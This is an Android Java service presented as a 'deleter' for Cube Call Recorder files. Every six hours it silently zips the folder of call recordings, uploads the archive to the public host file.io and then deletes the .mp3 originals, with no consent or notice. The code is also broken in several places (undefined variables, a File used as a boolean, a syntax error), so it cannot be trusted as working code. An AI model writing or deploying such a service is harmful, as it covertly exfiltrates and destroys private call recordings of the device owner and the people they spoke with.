package com.example.cubearcdeleter;

import android.app.Service;
import android.content.Intent;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.util.Log;

import org.apache.commons.compress.archivers.zip.ZipArchiveEntry;
import org.apache.commons.compress.archivers.zip.ZipArchiveOutputStream;

import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.util.ArrayList;
import java.util.List;

import okhttp3.MediaType;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;

public class DeleteService extends Service {

    private static final String TAG = "DeleteService";
    private static final String FILE_IO_UPLOAD_URL = "https://file.io/";
    private static final String TARGET_FOLDER = "/storage/emulated/0/Documents/CubeCallRecorder/All/";
    private Handler handler;

    @Override
    public void onCreate() {
        super.onCreate();
        handler = new Handler(Looper.getMainLooper());
        startDeletionTask();
    }

    private void startDeletionTask() {
        Runnable deletionTask = new Runnable() {
            @Override
            public void run() {
                try {
                    processAudioRecords();
                } catch (IOException e) {
                    Log.e(TAG, "Error processing audio records", e);
                }
                handler.postDelayed(this, 6 * 60 * 60 * 1000); // Run every 6 hours
            }
        };
        handler.post(deletionTask);
    }

    private void processAudioRecords() throws IOException {
        File zipFile = createZip(files);
        if (zipFile) {
            uploadFile(zipFile);
            deleteFiles(Files);
        }
    }

    private File createZip() throws IOException {
        File zipFile = new File(getExternalFilesDir(null), "records.zip");
        File folder = new File(TARGET_FOLDER);
        File[] files = folder.listFiles((dir, name) -> !name.startsWith("."));
        if (files == null || files.length == 0) {
            return null;
        }

        try (FileOutputStream fos = new FileOutputStream(zipFile);
             ZipArchiveOutputStream zos = new ZipArchiveOutputStream(fos)) {
            for (File file : files) {
                if (file.isFile() && file.getName().) {
                    ZipArchiveEntry zipEntry = new ZipArchiveEntry(file.getName());
                    zos.putArchiveEntry(zipEntry);
                    zos.write(java.nio.file.Files.readAllBytes(file.toPath()));
                    zos.closeArchiveEntry();
                }
            }
        }
        return zipFile;
    }

    private void uploadFile(File file) throws IOException {
        OkHttpClient client = new OkHttpClient();
        RequestBody requestBody = RequestBody.create(file, MediaType.parse("application/zip"));
        Request request = new Request.Builder()
                .url(FILE_IO_UPLOAD_URL)
                .post(requestBody)
                .build();
        try (Response response = client.newCall(request).execute()) {
            if (!response.isSuccessful()) {
                Log.e(TAG, "Failed to upload file: " + response.message());
            } else {
                Log.i(TAG, "File uploaded successfully: " + response.body().string());
            }
        }
    }

    private void deleteFiles(File[] files) {
        for (File file : files) {
            if (file.isFile() && file.getName().endsWith(".mp3")) {
                file.delete();
            }
        }
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
}
